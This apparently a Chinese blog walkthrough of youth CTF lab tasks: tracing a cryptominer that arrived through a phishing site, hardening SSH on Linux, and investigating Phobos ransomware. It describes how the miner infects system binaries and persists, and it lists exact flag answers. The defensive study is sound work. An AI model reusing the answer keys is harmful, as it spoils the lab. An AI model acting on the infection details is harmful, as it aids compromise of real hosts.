+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004613256-cc03a749-b459-4371-a581-a9afe5ee48f6.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004640500-7cd382f9-7ad3-48ef-891f-9ad73c7b006a.png" srcset="/img/loading.gif" lazyload><!-- 这是一张图片，ocr 内容为： --><br><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004652054-c275adb3-8097-4d28-9bc4-5ba6e0ba8c46.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004679425-31e3492e-d1f8-4a0e-9dd6-6ff9b443e9ac.png" srcset="/img/loading.gif" lazyload></p>
+<p>我去，还挺好玩的，像剧本杀，直接问别人会得到小王访问了一个钓鱼网站 </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004776072-06d87e14-1786-4c02-ae6e-6b52ccf067a4.png" srcset="/img/loading.gif" lazyload></p>
+<p>问小张会得到说执行了&#x2F;home&#x2F;op&#x2F;restart_app.sh的文件</p>
+<p>这边系统给了我们提示说小王的网站问题很大，但我们也不能忽略小张的脚本，我们先cat看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004904742-7f2761e3-55a1-46a8-ab6c-4f4faaed2fbb.png" srcset="/img/loading.gif" lazyload></p>
+<p>看起来是没什么问题，那很确定问题就在小王遇到的这个网站身上了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004930944-320d7887-7df6-4918-a31b-118a95009cb0.png" srcset="/img/loading.gif" lazyload></p>
+<p>这种表述很有可能就是点到钓鱼网站去了，下的压根就不是什么正经软件，然后让挖矿文件乘虚而入了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005005437-40e1ca40-5330-4c33-a97d-1519e86366f7.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看历史记录也确实去看这玩意了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005025932-367bf42d-1a18-400b-91a1-9933b0c288a7.png" srcset="/img/loading.gif" lazyload></p>
+<p>做的还挺好的，太逼真了，不像好多钓鱼网站做的全是广告，一眼假</p>
+<p>下一个分析一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005124090-08ac253a-d660-4368-b461-e0a0234610ed.png" srcset="/img/loading.gif" lazyload></p>
+<p>先strings看看字符串</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005163694-877e6193-8618-4618-975b-407942052f02.png" srcset="/img/loading.gif" lazyload></p>
+<p>结果发现全出来了，都是熟人啊，确定了就是这个网址下下来的这玩意有毒</p>
+<p>所以flag{<a target="_blank" rel="noopener" href="http://www.superlog-pro.com}/">http://www.superlog-pro.com}</a></p>
+<h2 id="任务五：分析病毒文件"><a href="#任务五：分析病毒文件" class="headerlink" title="任务五：分析病毒文件"></a>任务五：<font style="color:rgba(0, 0, 0, 0.88);">分析病毒文件</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005300416-4e43bb81-e83f-4f9b-bc03-d8ddb8245386.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们先提取出来这个病毒文件，IDA分析一手</p>
+<p>先扔到DIE看看，发现是64位，无壳</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058001167-173d2b6e-e74e-4ff8-97a2-2bf59d279822.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来进行IDA分析</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058058949-24115b6b-a479-4aaa-a5a3-86e648c8c3f0.png" srcset="/img/loading.gif" lazyload></p>
+<p>定位到main函数直接反编译看一眼</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058138867-b33db23e-5fed-4067-9995-f4f91a417b9b.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这些地方都在进行伪装，假冒自己是个正经软件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058477947-d01515d6-a756-4bcc-9388-68e2975b2867.png" srcset="/img/loading.gif" lazyload></p>
+<p>实际上这边已经以二进制在&#x2F;tmp&#x2F;kworkerds写入了病毒文件，还顺便修改了权限，我们转化成八进制就可以发现改为了0755的权限</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058709436-6d471e2b-8878-4002-8d34-e60f951c5e25.png" srcset="/img/loading.gif" lazyload></p>
+<p>在sub_1670函数中可以看到这样子的内容，四次write，把病毒主体、源文件内容、感染标记统统写进去</p>
+<p>根据逻辑，如果感染出现问题，会跳转到这个LABEL_19的标签的地方，然后就会执行v5&#x3D;*v4++来得到下一个待感染的文件路径</p>
+<p>所以v4即为感染的文件路径，我们定位v4</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058728437-effc63c1-6024-4f85-a7d1-765ff566a6f8.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现v4个off_3CA8有关(注意一开始上边还有个&#x2F;bin&#x2F;ls)</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058868301-f5b20850-5ada-4ce9-92d0-0117f7756ec5.png" srcset="/img/loading.gif" lazyload></p>
+<p>于是我们得到了这一题的答案，也就是感染的所有顺序，并且是按顺序下来的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058997169-d9f5771b-f25c-42da-b7d9-c477e1ace0f5.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续往下看还能看见调用了这样子的一个函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059025707-992fd231-99c1-4d9f-a903-21398cec5f64.png" srcset="/img/loading.gif" lazyload></p>
+<p>守护进程.0guardian正安放于此</p>
+<p>依旧chmod改了权限，并且设置了定时任务，正如我们上文分析的一样</p>
+<p>总之这一题的答案就是md5(&#x2F;bin&#x2F;ls,&#x2F;bin&#x2F;ps,&#x2F;bin&#x2F;cat,&#x2F;bin&#x2F;rm,&#x2F;bin&#x2F;ss,&#x2F;usr&#x2F;bin&#x2F;stat,&#x2F;usr&#x2F;bin&#x2F;top,&#x2F;usr&#x2F;bin&#x2F;wget,&#x2F;usr&#x2F;bin&#x2F;curl,&#x2F;usr&#x2F;bin&#x2F;vi,&#x2F;usr&#x2F;bin&#x2F;sudo)</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059204659-ab3edb0d-d76f-419f-b832-f68734fcec9b.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以是flag{dac48e98a53b81b0218e2156e364f7ba}</p>
+<h2 id="任务六：修复系统并恢复文件完整性"><a href="#任务六：修复系统并恢复文件完整性" class="headerlink" title="任务六：修复系统并恢复文件完整性"></a>任务六：<font style="color:rgba(0, 0, 0, 0.88);">修复系统并恢复文件完整性</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059229029-27d7ad8b-0b20-472f-b16d-c9ab161fb648.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们上一题已经知道了感染的程序情况，这玩意是只有启动setup的时候才会改的，所以我们现在可以直接进行恢复，不用担心再生</p>
+<p>这一题作者有提示，已经将对应程序的debian软件包给放在了&#x2F;deb_final路径，我们只需要直接dpkg对这些已经下载好的本地包进行安装即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">dpkg -i *.deb<br></code></pre></td></tr></table></figure>
+
+<p>通过这一步我们可以直接将程序进行覆盖更新，从而将原来染病的全都覆盖掉</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059683436-352d3eab-1caf-4012-a9b5-3c209533ab2f.png" srcset="/img/loading.gif" lazyload></p>
+<p>马上就全部覆盖更新好了，既然已经复原好了，那我们直接去&#x2F;var&#x2F;flag&#x2F;1拿flag就好了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059769845-557a673c-0331-4224-9c69-d116551f50ce.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag{e510c5fca680b1b4bd5c9d8d6b3f4bdc}</p>
+<h2 id="任务七：最终清理"><a href="#任务七：最终清理" class="headerlink" title="任务七：最终清理"></a>任务七：<font style="color:rgba(0, 0, 0, 0.88);">最终清理</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059814910-69dd766c-d45b-4971-88a9-246382e58fc5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们已经搞清楚了具体都是点啥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">1，计划任务<br>2，挖矿程序<br>3，守护进程<br>4，挖矿进程<br></code></pre></td></tr></table></figure>
+
+<p>注意这边要按顺序，我们得先去掉计划任务才能进行对挖矿程序的删除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">systemctl stop cron<br><br>rm -rf /etc/cron.d/0guardian<br>rm -rf /usr/bin/.0guardian<br>rm -rf /tmp/kworkerds<br>pkill -f .0guardian<br>pkill -f kworkerds<br><br>cat /var/flag/2<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767060958328-fe7e6b41-50fd-43d2-91aa-b62037b63a7e.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag{081ce3688c6cd6e2946125081381087c}</p>
+<h1 id="Linux安全加固-主机运维"><a href="#Linux安全加固-主机运维" class="headerlink" title="Linux安全加固-主机运维"></a>Linux安全加固-主机运维</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767066323654-15634e0f-3dec-4802-a327-d4b7fb95985a.png" srcset="/img/loading.gif" lazyload></p>
+<p>来继续做一下青少年CTF的靶场，一共没几题</p>
+<p>这边是针对Linux的一次加固练习，解决风险</p>
+<h2 id="任务一：修改用户：bus的ssh密码"><a href="#任务一：修改用户：bus的ssh密码" class="headerlink" title="任务一：修改用户：bus的ssh密码"></a>任务一：<font style="color:rgba(0, 0, 0, 0.88);">修改用户：bus的ssh密码</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767066365124-623c0a7e-ce08-4c12-bb92-4b04b8434e85.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据题目我们就已经知道了原来的密码是bus123</p>
+<p>这是很典型的弱口令密码，很容易被爆破出来</p>
+<p>我们利用命令进行更改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo passwd bus<br>#然后填个包含大小写字母，数字，特殊字符的高强度密码，输入两遍即可<br>#我这边写的是Gr3@tP@ss!<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767066649152-a17985f0-cc3c-425b-82b4-f75167cfbda1.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边为了保护都是不显现的，不过看见successfully就是成功了</p>
+<p>改完之后按校验即可发现成功</p>
+<h2 id="任务二：允许root用户ssh远程登录"><a href="#任务二：允许root用户ssh远程登录" class="headerlink" title="任务二：允许root用户ssh远程登录"></a>任务二：<font style="color:rgba(0, 0, 0, 0.88);">允许root用户ssh远程登录</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767066748563-0d63b657-cc29-4038-b87f-6b3a7d567c0f.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果我们想做到这一点，我们需要将ssh的配置文件中的PermitRootLogin给开启</p>
+<p>这是一个很危险的设置，但是根据题目要求我们去做一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo vim /etc/ssh/sshd_config<br></code></pre></td></tr></table></figure>
+
+<p>ssh的配置文件一般都在这个地方&#x2F;etc&#x2F;ssh&#x2F;sshd_config</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067011458-cc454e05-9ff0-49b5-b1a2-460ba5226799.png" srcset="/img/loading.gif" lazyload></p>
+<p>把这行改了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067114237-49853f37-fd7a-4098-aba0-a6d3a75ccd8e.png" srcset="/img/loading.gif" lazyload></p>
+<p>一般这个时候我们需要重启ssh服务才能生效（不过我直接校验也给过了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo systemctl restart sshd<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="任务三：运维远程完毕，可关闭root用户的ssh远程权限"><a href="#任务三：运维远程完毕，可关闭root用户的ssh远程权限" class="headerlink" title="任务三：运维远程完毕，可关闭root用户的ssh远程权限"></a>任务三：<font style="color:rgba(0, 0, 0, 0.88);">运维远程完毕，可关闭root用户的ssh远程权限</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067209674-41bfcfdf-7f12-4c3d-b4f0-66f6f0026ad2.png" srcset="/img/loading.gif" lazyload></p>
+<p>就是上边那个，然后把yes改成no就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo vim /etc/ssh/sshd_config<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067255079-0ab5fae8-39ed-4a8b-bde4-e77702f11c32.png" srcset="/img/loading.gif" lazyload></p>
+<p>没什么好说的</p>
+<h2 id="任务四：创建新用户并配置SSH私钥"><a href="#任务四：创建新用户并配置SSH私钥" class="headerlink" title="任务四：创建新用户并配置SSH私钥"></a>任务四：<font style="color:rgba(0, 0, 0, 0.88);">创建新用户并配置SSH私钥</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067277037-d7810223-d358-4adf-a3a0-9611d48ee49e.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后让我们创建一个back用户并修改其密码，生成私钥</p>
+<p>一步步来，首先创建back用户顺便修改密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo useradd -m back<br>sudo passwd back<br></code></pre></td></tr></table></figure>
+
+<p>这边-m是为了自动创建用户主目录</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067427514-91da70b4-2feb-4566-ac3c-b450ccca43a0.png" srcset="/img/loading.gif" lazyload></p>
+<p>题目没规定，随便输入吧，我输入的是bus123</p>
+<p>接下来就是生成私钥了</p>
+<p>首先切换到back用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo su - back  #切换用户<br>ssh-keygen -t rsa  #生成密钥对<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067693546-00a892d7-fcc6-4158-b075-fb429363cca8.png" srcset="/img/loading.gif" lazyload></p>
+<p>生成密钥对直接回车用默认的文件路径和空的密码即可，也没要求</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067725532-cf02901e-43c1-4013-b8e3-239e80feddfe.png" srcset="/img/loading.gif" lazyload></p>
+<p>默认的路径是私钥文件在~&#x2F;.ssh&#x2F;id_rsa，然后公钥在id_rsa.pub</p>
+<p>接下来配置公钥，设置权限</p>
+<p>注意，这边的权限设置极为重要，没有的话是不给过认证的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys<br><br>chmod 700 ~/.ssh<br>chmod 600 ~/.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067793136-0b059b91-4028-4fc7-a4e6-f24b522bd42c.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067806266-e817a4d7-8e4b-430f-a8bb-80c3892f5182.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就做完了，很简单吧（</p>
+<h1 id="2700勒索病毒排查"><a href="#2700勒索病毒排查" class="headerlink" title="2700勒索病毒排查"></a>2700勒索病毒排查</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767069758933-f0710b56-d748-41b7-9632-5ffe65a6c0a9.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/XFisEU5Gdk245cn8jsnlZQ">https://mp.weixin.qq.com/s/XFisEU5Gdk245cn8jsnlZQ</a></p>
+<p>这边写了靶机的使用说明，我们可以利用SSH连接后sftp进行文件传输</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767069836658-72bdc5aa-adda-495e-bdf0-30670f7f268a.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="任务一：此勒索家族名称是什么？"><a href="#任务一：此勒索家族名称是什么？" class="headerlink" title="任务一：此勒索家族名称是什么？"></a>任务一：<font style="color:rgba(0, 0, 0, 0.88);">此勒索家族名称是什么？</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767069863230-f52723b1-ff5a-48fe-8516-6f5a2e8592ff.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们在题目中已经了解到这是一个勒索病毒，并且存在勒索信</p>
+<p>先打开看看吧</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070142787-d3454b46-0b4f-427d-93cb-edeb78115d93.png" srcset="/img/loading.gif" lazyload></p>
+<p>一片大好啊，全部变成.2700文件了</p>
+<p>不过还剩了勒索信的txt文件和hta文件，我们打开看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070254469-c35997d5-23a4-4c02-8f9c-640d2f5a886d.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070271158-adba17f0-cffc-47fc-9f67-dfce03eb838e.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以发现这边给了一个邮箱和一个ID，拿来勒索要钱的估计是，根据题目要求，我们可以去应急响应.com来根据邮箱锁定勒索家族</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070355958-e43f9883-d934-4ab9-b8fb-3cbd706217d8.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070367833-049c1e8a-2fab-4b9d-bfd2-d0fd7dba4e64.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功定位到了病毒家族，符合加密后缀以及勒索信件格式，所以这一题的答案就是Phobos</p>
+<h2 id="任务二：勒索病毒预留的ID是什么"><a href="#任务二：勒索病毒预留的ID是什么" class="headerlink" title="任务二：勒索病毒预留的ID是什么"></a>任务二：<font style="color:rgba(0, 0, 0, 0.88);">勒索病毒预留的ID是什么</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070419351-52caf25b-53df-4d6c-85f3-6296dc365f53.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070454075-d84dbe4a-0ebd-4050-a091-3b3e1450e1ee.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这边的hta文件里给了预留的ID，ID为4A30C4F9-3524</p>
+<p>题目说如果有多个以&amp;连接，但是所有的hta打开来发现都是这个ID，而且所有文件名儿都带着这个ID，所以其实就这一个ID</p>
+<p>所以答案就是flag{4A30C4F9-3524}</p>
+<h2 id="任务三：提交开始加密的时间"><a href="#任务三：提交开始加密的时间" class="headerlink" title="任务三：提交开始加密的时间"></a>任务三：<font style="color:rgba(0, 0, 0, 0.88);">提交开始加密的时间</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070572024-b8a6d244-22ab-4e15-903b-3e50f0409c96.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070615903-9298666c-13cd-447b-807c-917f34be06c8.png" srcset="/img/loading.gif" lazyload></p>
+<p>一般来说勒索病毒在加密的时候不会差很多时间，基本上就是一瞬间全加密完了，不给你留时间转移</p>
+<p>所以打开几个看看就知道了</p>
+<p>修改时间是flag{2025&#x2F;11&#x2F;19 14:31}</p>
+<h2 id="任务四：恢复文件"><a href="#任务四：恢复文件" class="headerlink" title="任务四：恢复文件"></a>任务四：<font style="color:rgba(0, 0, 0, 0.88);">恢复文件</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070705173-77b89431-716c-4f31-9425-b28ecb9141d9.png" srcset="/img/loading.gif" lazyload></p>
+<p>勒索病毒没那么好解密，要是那么容易被解也就勒索不到钱了，我们跟着提示老老实实去应急响应.com找一个恢复工具吧还是</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070802404-760a6c5c-f88e-4e34-8155-7a8f11690dcf.png" srcset="/img/loading.gif" lazyload></p>
+<p>先找到这个文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070886525-dd6594e3-331e-4f71-ba43-1498b758b57c.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们提取出来，利用上边公众号说的提取出来</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071079054-029fbcca-b491-4efd-b4ca-08d244af36f5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边直接填入qsnctf的手机号和密码</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071104677-e230b794-f33e-4c36-a135-80dd30755b6f.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071207014-e9c036b2-50c2-4494-9da9-01e4e5388c8f.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们就能进入home文件夹了，接下来直接xshell连接就好了，把这个加密flag扔进去</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071228195-0d461d16-3ebb-47e9-be97-4716b9d08caa.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们在xshell先ssh（主机号就是nas.qsnctf.com，用户名和密码跟刚刚的都一样），然后右键选择Xftp打开即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071244170-6ecc7e33-db8f-4286-8916-7d47224a34ce.png" srcset="/img/loading.gif" lazyload></p>
+<p>弄到本机就可以用恢复程序了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071363298-229004a9-f5c2-41b4-81f2-10b0ac11b3dc.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071372399-06c2700a-46a5-4214-8755-c00f32525a2e.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功得到解密的flag，填入即可</p>
+<h2 id="任务五：提交发送邮件的邮箱"><a href="#任务五：提交发送邮件的邮箱" class="headerlink" title="任务五：提交发送邮件的邮箱"></a>任务五：<font style="color:rgba(0, 0, 0, 0.88);">提交发送邮件的邮箱</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071405161-434ee193-374d-460e-9346-c63ae6b2a1f4.png" srcset="/img/loading.gif" lazyload></p>
